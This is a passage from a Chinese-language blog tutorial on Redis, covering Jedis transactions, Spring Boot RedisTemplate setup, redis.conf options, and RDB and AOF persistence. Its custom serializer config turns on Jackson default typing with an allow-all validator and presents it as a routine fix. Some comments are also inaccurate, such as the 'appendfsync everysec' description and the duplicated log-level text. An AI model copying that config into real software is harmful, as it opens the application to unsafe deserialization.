class="line">            System.out.println(jedis.get(<span class="string">&quot;k1&quot;</span>));</span><br><span class="line">            <span class="comment">//关闭连接</span></span><br><span class="line">            jedis.close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/2d6155bbc2e8d5bd49448f0662266a75--97f2--image-20240921134812192.png" alt="image-20240921134812192"></p>
<p>事务执行失败，我们将异常代码注释后再次去执行</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/16528c65767cc3261262bd29ce9df9de--7e3f--image-20240921134859639.png" alt="image-20240921134859639"></p>
<p>成功完成对应事务的执行</p>
<h1 id="七、springboot整合"><a href="#七、springboot整合" class="headerlink" title="七、springboot整合"></a>七、springboot整合</h1><p>SpringData 也是和 SpringBoot 齐名的项目</p>
<p>官方：<a href="https://spring.io/projects/spring-data-redis">https://spring.io/projects/spring-data-redis</a></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/b0acc7270139d7e8b3ae9f05a3d7e2a9--f176--image-20240921134944904.png" alt="image-20240921134944904"></p>
<p>说明： 在 SpringBoot2.x 之后，原来使用的jedis 被替换为了 lettuce?</p>
<ul>
<li><p>jedis：采用的直连，多个线程操作的话，是不安全的，如果想要避免不安全，使用redis pool连接池，更像BIO模式！</p>
</li>
<li><p>lettuce：采用netty，实例可以再多个线程中进行共享，不存在线程不安全的情况，可以减少线程数据。更新NIO模式！</p>
</li>
</ul>
<blockquote>
<p>简单的使用</p>
</blockquote>
<p>1、首先就是配置对应的连接</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置redis1</span></span><br><span class="line"><span class="attr">spring.data.redis.host</span>=<span class="string">127.0.0.1</span></span><br><span class="line"><span class="attr">spring.data.redis.port</span>=<span class="string">6379</span></span><br></pre></td></tr></table></figure>

<p>2、编写简单的测试项目</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RedisTemplate redisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">contextLoads</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//redisTemplate 操作不同的数据类型，api和我们的linux指令一样</span></span><br><span class="line">        <span class="comment">//opsForValue 操作字符串</span></span><br><span class="line">        <span class="comment">//opsForList 操作List</span></span><br><span class="line">        <span class="comment">//opsForSet</span></span><br><span class="line">        <span class="comment">//opsForZSet</span></span><br><span class="line">        <span class="comment">//opsForHash</span></span><br><span class="line">        <span class="comment">//opsForGeo</span></span><br><span class="line">        <span class="comment">//opsForHyperLogLog</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//除了基本的操作，我们常用的方法都可以通过redisTemplate操作，比如事务，和基本的CRUD</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取redis的连接对象</span></span><br><span class="line"><span class="comment">//        RedisConnection connection = redisTemplate.getConnectionFactory().getConnection();</span></span><br><span class="line"><span class="comment">//        connection.flushDb();</span></span><br><span class="line"><span class="comment">//        connection.flushAll();</span></span><br><span class="line"></span><br><span class="line">        redisTemplate.opsForValue().set(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;zyy&quot;</span>);</span><br><span class="line">        System.out.println(redisTemplate.opsForValue().get(<span class="string">&quot;name&quot;</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/adc889f8e480d9101e9a682cf07cc03e--5f82--image-20240921141546981.png" alt="image-20240921141546981"></p>
<blockquote>
<p>进阶使用，使用redis存储对象</p>
</blockquote>
<p>User.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.demo.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">lizhua</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;lizhua&quot;</span>, <span class="number">15</span>);</span><br><span class="line">        redisTemplate.opsForValue().set(<span class="string">&quot;lizhua&quot;</span>, lizhua);</span><br><span class="line">        System.out.println(redisTemplate.opsForValue().get(<span class="string">&quot;lizhua&quot;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/d54e39df5466feaae7298cf97aee5e9a--02fa--image-20240921141850293.png" alt="image-20240921141850293"></p>
<blockquote>
<p>注！！！！！如需存储对象到redis中需要将对象继承序列化方法才可以</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/5fb2c887df536e08e31f621f6cf8adb8--df92--image-20240921142050011.png" alt="image-20240921142050011"></p>
<p>但是仅仅是这样还是不够完美，我们发现使用客户端去直接查看时，中文就变成乱码了</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/aea4bca65b7304367936beaf35015e1b--43f7--image-20240921142355477.png" alt="image-20240921142355477"></p>
<blockquote>
<p>为解决上述问题，自定义RedisTemplate</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.demo.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonAutoDetect;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonTypeInfo;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.PropertyAccessor;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.jsontype.impl.LaissezFaireSubTypeValidator;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.connection.RedisConnectionFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.RedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.serializer.Jackson2JsonRedisSerializer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.serializer.StringRedisSerializer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedisConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RedisTemplate&lt;String, Object&gt; <span class="title function_">redisTemplate</span><span class="params">(RedisConnectionFactory factory)</span> &#123;</span><br><span class="line">        RedisTemplate&lt;String, Object&gt; template = <span class="keyword">new</span> <span class="title class_">RedisTemplate</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//连接工厂</span></span><br><span class="line">        template.setConnectionFactory(factory);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        objectMapper.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY);</span><br><span class="line">        <span class="comment">//enableDefaultTyping过期了</span></span><br><span class="line"><span class="comment">//        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);</span></span><br><span class="line">        <span class="comment">//用activateDefaultTyping代替</span></span><br><span class="line">        objectMapper.activateDefaultTyping(</span><br><span class="line">                LaissezFaireSubTypeValidator.instance ,</span><br><span class="line">                ObjectMapper.DefaultTyping.NON_FINAL,</span><br><span class="line">                JsonTypeInfo.As.WRAPPER_ARRAY);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//jackson序列化</span></span><br><span class="line">        Jackson2JsonRedisSerializer&lt;Object&gt; jackson2JsonRedisSerializer = <span class="keyword">new</span> <span class="title class_">Jackson2JsonRedisSerializer</span>&lt;&gt;(objectMapper, Object.class);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//String序列化</span></span><br><span class="line">        <span class="type">StringRedisSerializer</span> <span class="variable">stringRedisSerializer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringRedisSerializer</span>();</span><br><span class="line">        <span class="comment">//key采用String的序列化方式</span></span><br><span class="line">        template.setKeySerializer(stringRedisSerializer);</span><br><span class="line">        <span class="comment">//hash的key也采用String的序列化方式</span></span><br><span class="line">        template.setHashKeySerializer(stringRedisSerializer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//value序列化方式采用jackson</span></span><br><span class="line">        template.setValueSerializer(jackson2JsonRedisSerializer);</span><br><span class="line">        <span class="comment">//hash的value序列化方式采用jackson</span></span><br><span class="line">        template.setHashValueSerializer(jackson2JsonRedisSerializer);</span><br><span class="line"></span><br><span class="line">        template.afterPropertiesSet();</span><br><span class="line">        <span class="keyword">return</span> template;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>再次运行上面的</p>
<p>正常取值</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/cc250327ab2d4ee774839c919d390770--b259--image-20240921143716188.png"></p>
<p>现在显示就是正常的了</p>
<p>所有的redis操作，其实对于java开发人员来说，十分的简单，更重要是要去理解redis的思想和每一种数</p>
<p>据结构的用处和作用场景！</p>
<h1 id="八、Redis-conf详解"><a href="#八、Redis-conf详解" class="headerlink" title="八、Redis.conf详解"></a>八、Redis.conf详解</h1><p>启动的时候，可以在启动加上配置文件位置，使用对应的配置文件去启动</p>
<blockquote>
<p>表明了对应的单位，并且表示大小写不敏感</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/fda14849b1e9af594d4baed01e26179c--d09c--image-20240921144117554.png" alt="image-20240921144117554"></p>
<blockquote>
<p>包含include，表名可以应用其他的配置文件</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/4f70669716fa4ed2b31fef9a7a32271f--d02d--image-20240921144208388.png" alt="image-20240921144208388"></p>
<blockquote>
<p>network 网络</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">bind</span> 127.0.0.1  <span class="comment"># 绑定ip</span></span><br><span class="line">protected-mode <span class="built_in">yes</span> <span class="comment"># 是否开启保护模式，默认开启。要是配置里没有指定bind和密码。开启该参数后，redis只会本地进行访问，拒绝外部访问。要是开启了密码和bind，可以关闭。否则最好开启，设置为yes。</span></span><br><span class="line">port 6379 <span class="comment"># 端口</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>general 通用</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">daemonize <span class="built_in">yes</span> <span class="comment"># 以守护进程的方式运行(是否在后台执行)，默认是 no </span></span><br><span class="line">pidfile /var/run/redis_6379.pid <span class="comment"># 在后台的方式运行，我们就需要指定一个pid文件</span></span><br><span class="line">loglevel notice <span class="comment"># 设置日志等级</span></span><br><span class="line">logfile <span class="string">&quot;&quot;</span> <span class="comment"># 指定了记录日志的文件 空字符串的话，日志会打印到标准输出设备。后台运行的redis标准输出是/dev/null</span></span><br><span class="line">databases 16  <span class="comment"># 数据库的数量，默认是16个数据库</span></span><br><span class="line">always-show-logo no <span class="comment"># 是否总显示logo</span></span><br></pre></td></tr></table></figure>

<p>日志等级</p>
<ul>
<li>debug (a lot of information, useful for development&#x2F;testing)  很多信息，方便开发、测试</li>
<li>verbose (many rarely useful info, but not a mess like the debug level) 许多有用的信息，但是没有debug级别信息多</li>
<li>notice (moderately verbose, what you want in production probably) 适当的日志级别，适合生产环境</li>
<li>warning (only very important &#x2F; critical messages are logged) 许多有用的信息，但是没有debug级别信息多</li>
</ul>
<blockquote>
<p>snapshotting 快照</p>
</blockquote>
<p>持久化， 在规定的时间内，执行了多少次操作，则会持久化到文件</p>
<p>redis 是内存数据库，如果没有持久化，那么数据断电及失！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">save 900 1 <span class="comment"># 如果900秒内，如果至少 1 个key进行了修改，我们则进行持久化操作</span></span><br><span class="line">save 300 10 <span class="comment"># 如果300秒内，如果至少 10 个key进行了修改，我们则进行持久化操作</span></span><br><span class="line">save 60 10000 <span class="comment"># 如果60秒内，如果至少 10000 个key进行了修改，我们则进行持久化操作</span></span><br><span class="line">stop-writes-on-bgsave-error <span class="built_in">yes</span> <span class="comment">#当RDB持久化出现错误后，是否依然进行继续进行工作，yes：不能进行工作，no：可以继续进行工作，可以通过info中的rdb_last_bgsave_status了解RDB持久化是否有错误</span></span><br><span class="line">rdbcompression <span class="built_in">yes</span> <span class="comment">#使用压缩rdb文件，rdb文件压缩使用LZF压缩算法，yes：压缩，但是需要一些cpu的消耗。no：不压缩，需要更多的磁盘空间</span></span><br><span class="line">rdbchecksum <span class="built_in">yes</span> <span class="comment">#是否校验rdb文件。从rdb格式的第五个版本开始，在rdb文件的末尾会带上CRC64的校验和。这跟有利于文件的容错性，但是在保存rdb文件的时候，会有大概10%的性能损耗，所以如果你追求高性能，可以关闭该配置。</span></span><br><span class="line"><span class="built_in">dir</span> ./ <span class="comment"># rdb文件保存的目录</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>replication 复制，后面讲到主从复制的时候再说</p>
</blockquote>
<blockquote>
<p>security 安全</p>
</blockquote>
<p>可以在这里设置redis的密码，默认是没有密码！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; ping</span><br><span class="line">PONG</span><br><span class="line">127.0.0.1:6379&gt; config get requirepass <span class="comment"># 获取redis的密码</span></span><br><span class="line">1) <span class="string">&quot;requirepass&quot;</span></span><br><span class="line">2) <span class="string">&quot;&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> requirepass 123456 <span class="comment"># 设置redis的密码  取消密码的话，这样设置即可  config set requirepass &quot;&quot;</span></span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<p>重新打开一个服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@iZwz9efdd2ukk4oauustczZ ~]<span class="comment"># /usr/local/bin/redis-cli -p 6379</span></span><br><span class="line">127.0.0.1:6379&gt; ping <span class="comment"># 发现所有的命令都没有权限了</span></span><br><span class="line">(error) NOAUTH Authentication required.</span><br><span class="line">127.0.0.1:6379&gt; auth 123456  <span class="comment"># 密码验证</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; ping <span class="comment"># 然后就可以正常使用命令了</span></span><br><span class="line">PONG</span><br><span class="line">127.0.0.1:6379&gt; config get requirepass</span><br><span class="line">1) <span class="string">&quot;requirepass&quot;</span></span><br><span class="line">2) <span class="string">&quot;123456&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br></pre></td></tr></table></figure>



<blockquote>
<p>clients 限制</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">maxclients 10000 <span class="comment"># 设置能连上redis的最大客户端连接数量。默认是10000个客户端连接。由于redis不区分连接是客户端连接还是内部打开文件或者和slave连接等，所以maxclients最小建议设置到32。如果超过了maxclients，redis会给新的连接发送’max number of clients reached’，并关闭连接。</span></span><br><span class="line">maxmemory &lt;bytes&gt; <span class="comment">#redis配置的最大内存容量。当内存满了，需要配合maxmemory-policy策略进行处理。注意slave的输出缓冲区是不计算在maxmemory内的。所以为了防止主机内存使用完，建议设置的maxmemory需要更小一些。</span></span><br><span class="line">maxmemory-policy noeviction <span class="comment"># 内存达到上限的处理策略</span></span><br></pre></td></tr></table></figure>

<p>当 Redis 内存使用达到 <code>maxmemory </code>时，需要选择设置好的 <code>maxmemory-policy </code>进行对数据进行淘汰机制。</p>
<p>​    1.volatile-lru(least recently used):最近最少使用算法，从设置了过期时间的键key中选择空转时间最长的键值对清除掉；</p>
<p>​    2.volatile-lfu(least frequently used):最近最不经常使用算法，从设置了过期时间的键中选择某段时间之内使用频次最小的键值对清除掉；</p>
<p>​    3.volatile-ttl:从设置了过期时间的键中选择过期时间最早的键值对清除；</p>
<p>​    4.volatile-random:从设置了过期时间的键中，随机选择键进行清除；</p>
<p>​    5.allkeys-lru:最近最少使用算法，从所有的键中选择空转时间最长的键值对清除；</p>
<p>​    6.allkeys-lfu:最近最不经常使用算法，从所有的键中选择某段时间之内使用频次最少的键值对清除；</p>
<p>​    7.allkeys-random:所有的键中，随机选择键进行删除；</p>
<p>​    8.noeviction:不做任何的清理工作，在redis的内存超过限制之后，所有的写入操作都会返回错误；但是读操作都能正常的进行;</p>
<blockquote>
<p>append only mode </p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">appendonly no <span class="comment">#默认redis使用的是rdb方式持久化，这种方式在许多应用中已经足够用了。但是redis如果中途宕机，会导致可能有几分钟的数据丢失，根据save来策略进行持久化，Append Only File是另一种持久化方式，可以提供更好的持久化特性。Redis会把每次写入的数据在接收后都写入 appendonly.aof 文件，每次启动时Redis都会先把这个文件的数据读入内存里，先忽略RDB文件。</span></span><br><span class="line">appendfilename <span class="string">&quot;appendonly.aof&quot;</span> <span class="comment"># aof文件名</span></span><br><span class="line"><span class="comment"># appendfsync always # 表示每次写入都执行fsync，以保证数据同步到磁盘</span></span><br><span class="line">appendfsync everysec <span class="comment"># 表示每次写入都执行fsync，以保证数据同步到磁盘</span></span><br><span class="line"><span class="comment"># appendfsync no # 表示不执行fsync，由操作系统保证数据同步到磁盘，速度最快</span></span><br></pre></td></tr></table></figure>

<h1 id="九、redis持久化"><a href="#九、redis持久化" class="headerlink" title="九、redis持久化"></a>九、redis持久化</h1><p>Redis 是内存数据库，如果不将内存中的数据库状态保存到磁盘，那么一旦服务器进程退出，服务器中的数据库状态也会消失。所以 Redis 提供了持久化功能！</p>
<h2 id="1、RDB-redis-dbbase"><a href="#1、RDB-redis-dbbase" class="headerlink" title="1、RDB(redis dbbase)"></a>1、RDB(redis dbbase)</h2><blockquote>
<p>什么是rdb</p>
</blockquote>
<p>RDB是一种快照存储持久化方式，具体就是将Redis某一时刻的内存数据保存到硬盘的文件当中，默认保存的文件名为dump.rdb，而在Redis服务器启动时，会重新加载dump.rdb文件的数据到内存当中恢复数据。</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/34284700d944fa3b29da668861c41351--9603--image-20240921145925849.png" alt="image-20240921145925849"></p>
<p>在指定的时间间隔内将内存中的数据集快照写入磁盘，也就是行话讲的Snapshot快照，它恢复时是将快照文件直接读到内存里。</p>
<p>Redis会单独创建（fork）一个子进程来进行持久化，会先将数据写入到一个临时文件中，待持久化过程都结束了，再用这个临时文件替换上次持久化好的文件。整个过程中，主进程是不进行任何IO操作的。这就确保了极高的性能。如果需要进行大规模数据的恢复，且对于数据恢复的完整性不是非常敏感，那RDB方式要比AOF方式更加的高效。RDB的缺点是最后一次持久化后的数据可能丢失。我们默认的就是RDB，一般情况下不需要修改这个配置！</p>
<p>有时候在生产环境我们会将这个文件进行备份！</p>
<p>rdb保存的文件是dump.rdb 都是在我们的配置文件中快照中进行配置的！</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/86df4f368190fdf8395ace68bc36dc3f--e7a8--image-20240921150223612.png" alt="image-20240921150223612"></p>
<p>启动并登陆redis</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@iZwz9efdd2ukk4oauustczZ ~]<span class="comment"># /usr/local/bin/redis-server /usr/local/bin/myconfig/redis.conf</span></span><br><span class="line">[root@iZwz9efdd2ukk4oauustczZ ~]<span class="comment"># /usr/local/bin/redis-cli -p 6379</span></span><br></pre></td></tr></table></figure>

<p>查看dump.rdb文件保存的路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; config get <span class="built_in">dir</span></span><br><span class="line">1) <span class="string">&quot;dir&quot;</span></span><br><span class="line">2) <span class="string">&quot;/usr/local/bin&quot;</span>   <span class="comment"># 如果在这个目录下存在 dump.rdb 文件，启动就会自动恢复其中的数据</span></span><br></pre></td></tr></table></figure>

<p>去root目录先把dump.rdb删除了</p>
<p>然后如下操作</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> k1 v1</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> k2 v2</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> k3 v3 </span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> k4 v4</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> k5 v5</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<p><code>set k5 v5</code>的时候发现，root目录下生成了一个dump.rdb</p>
<p><img src="https://typora-picture1234.oss-cn-shenzhen.aliyuncs.com/typora/img/image-20230425154907012.png" alt="image-20230425154907012"></p>
<p>然后我们关闭redis服务（断电即失）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; shutdown</span><br><span class="line">not connected&gt; <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<p>这个时候我们再次登陆redis服务，然后<code>get k1</code>,发现仍然可以取到值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@iZwz9efdd2ukk4oauustczZ ~]<span class="comment"># /usr/local/bin/redis-server /usr/local/bin/myconfig/redis.conf</span></span><br><span class="line">[root@iZwz9efdd2ukk4oauustczZ ~]<span class="comment"># /usr/local/bin/redis-cli -p 6379</span></span><br><span class="line">127.0.0.1:6379&gt; get k1</span><br><span class="line"><span class="string">&quot;v1&quot;</span></span><br></pre></td></tr></table></figure>

<p>验证完了，把redis.conf配置的save还原了</p>
<blockquote>
<p>触发机制</p>
</blockquote>
<ol>
<li>save的规则满足的情况下，会自动触发rdb规则</li>
<li>执行 flushall 命令，也会触发我们的rdb规则</li>
<li>退出redis，也会产生 rdb 文件</li>
</ol>
<p>备份就自动生成一个 dump.rdb</p>
<blockquote>
<p>如何恢复rdb文件</p>
</blockquote>
<ol>
<li><p>只需要将rdb文件放在我们redis启动目录就可以，redis启动的时候会自动检查dump.rdb 恢复其中的数据！</p>
</li>
<li><p>查看需要存在的位置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; config get <span class="built_in">dir</span></span><br><span class="line">1) <span class="string">&quot;dir&quot;</span></span><br><span class="line">2) <span class="string">&quot;/root&quot;</span>  <span class="comment"># 如果在这个目录下存在 dump.rdb 文件，启动就会自动恢复其中的数据</span></span><br></pre></td></tr></table></figure></li>
</ol>
<blockquote>
<p>优缺点</p>
</blockquote>
<p>优点：</p>
<ol>
<li>适合大规模的数据恢复</li>
<li>对数据的完整性要不高</li>
</ol>
<p>缺点：</p>
<ol>
<li>需要一定的时间间隔进程操作！如果redis意外宕机了，这个最后一次修改数据就没有的了</li>
<li>fork进程的时候，会占用一定的内容空间</li>
</ol>
<h2 id="2、AOF-append-only-file"><a href="#2、AOF-append-only-file" class="headerlink" title="2、AOF(append only file)"></a>2、AOF(append only file)</h2><p>与RDB存储某个时刻的快照不同，AOF持久化方式会记录客户端对服务器的每一次写操作命令，并将这些写操作以Redis协议追加保存到以后缀为aof文件末尾，在Redis服务器重启时，会加载并运行aof文件的命令，以达到恢复数据的目的。</p>
<blockquote>
<p>aof什么</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/f1a9fc29e65fc6c28a6a03bfafc5ae37--39b6--image-20240921150618250.png" alt="image-20240921150618250"></p>
<p>以日志的形式来记录每个写操作，将Redis执行过的所有指令记录下来（读操作不记录），只许追加文件但不可以改写文件，redis启动之初会读取该文件重新构建数据，换言之，redis重启的话就根据日志文件的内容将写指令从前到后执行一次以完成数据的恢复工作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有点类似于mysql导出的sql文件</span><br></pre></td></tr></table></figure>

<p>Aof保存的是 appendonly.aof 文件</p>
<blockquote>
<p>append</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/d8874bfb0e7fc795e1cfa6eaf9fbf1f9--23ac--image-20240921150627559.png" alt="image-20240921150627559"></p>
<p>然后重启redis,就可以生效了</p>
<p>如果这个 aof 文件有错位，这时候 redis 是启动不起来的吗，我们需要修复这个aof文件</p>
<p>redis 给我们提供了一个工具 <code>redis-check-aof --fix</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@iZwz9efdd2ukk4oauustczZ bin]<span class="comment"># redis-check-aof --fix /root/appendonlydir/appendonly.aof.1.incr.aof</span></span><br><span class="line">Start checking Old-Style AOF</span><br><span class="line">0x              30: Expected \r\n, got: 3131</span><br><span class="line">AOF analyzed: filename=/root/appendonlydir/appendonly.aof.1.incr.aof, size=68, ok_up_to=23, ok_up_to_line=12, diff=45</span><br><span class="line">This will shrink the AOF /root/appendonlydir/appendonly.aof.1.incr.aof from 68 bytes, with 45 bytes, to 23 bytes</span><br><span class="line">Continue? [y/N]: y</span><br><span class="line">Successfully truncated AOF /root/appendonlydir/appendonly.aof.1.incr.aof</span><br><span class="line">[root@iZwz9efdd2ukk4oauustczZ bin]<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<p>如果文件正常，重启就可以恢复了</p>
<blockquote>
<p>重写规则说明</p>
</blockquote>
<p>aof 默认就是文件的无限追加，文件会越来越大</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/ab219ac86957fd3ae82d2b8e8f0cb5d0--81d6--image-20240921150715489.png" alt="image-20240921150715489"></p>
<p>如果 aof 文件大于 64m，太大了！ fork一个新的进程来将我们的文件进行重写！</p>
<blockquote>
<p>优点缺点</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># appendfsync always # 表示每次写入都执行fsync，以保证数据同步到磁盘</span></span><br><span class="line">appendfsync everysec <span class="comment"># 表示每次写入都执行fsync，以保证数据同步到磁盘</span></span><br><span class="line"><span class="comment"># appendfsync no # 表示不执行fsync，由操作系统保证数据同步到磁盘，速度最快</span></span><br></pre></td></tr></table></figure>

<p>优点：</p>
<ol>
<li>每一次修改都同步，文件的完整性会更加好</li>
<li>每秒同步一次，可能会丢失一秒的数据</li>
<li>从不同步，效率最高的</li>
</ol>
<p>缺点：</p>
<ol>
<li>相对于数据文件来说，aof远远大于 rdb，修复的速度也比 rdb慢</li>
<li>Aof 运行效率也要比 rdb 慢，所以我们redis默认的配置就是rdb持久化</li>
</ol>
<h2 id="3、拓展"><a href="#3、拓展" class="headerlink" title="3、拓展"></a>3、拓展</h2><ol>
<li><p>RDB 持久化方式能够在指定的时间间隔内对你的数据进行快照存储</p>
</li>
<li><p>AOF 持久化方式记录每次对服务器写的操作，当服务器重启的时候会重新执行这些命令来恢复原始的数据，AOF命令以Redis 协议追加保存每次写的操作到文件末尾，Redis还能对AOF文件进行后台重写，使得AOF文件的体积不至于过大</p>
</li>
<li><p>只做缓存，如果你只希望你的数据在服务器运行的时候存在，你也可以不使用任何持久化</p>
</li>
<li><p>同时开启两种持久化方式</p>
<ul>
<li><p>在这种情况下，当redis重启的时候会优先载入AOF文件来恢复原始的数据，因为在通常情况下AOF文件保存的数据集要比RDB文件保存的数据集要完整</p>
</li>
<li><p>RDB 的数据不实时，同时使用两者时服务器重启也只会找AOF文件，那要不要只使用AOF呢？作者</p>
<p>建议不要，因为RDB更适合用于备份数据库（AOF在不断变化不好备份），快速重启，而且不会有</p>
<p>AOF可能潜在的Bug，留着作为一个万一的手段</p>
</li>
</ul>
</li>
<li><p>性能建议</p>
<ul>
<li><p>因为RDB文件只用作后备用途，建议只在Slave上持久化RDB文件，而且只要15分钟备份一次就够了，只保留 save 900 1 这条规则</p>
</li>
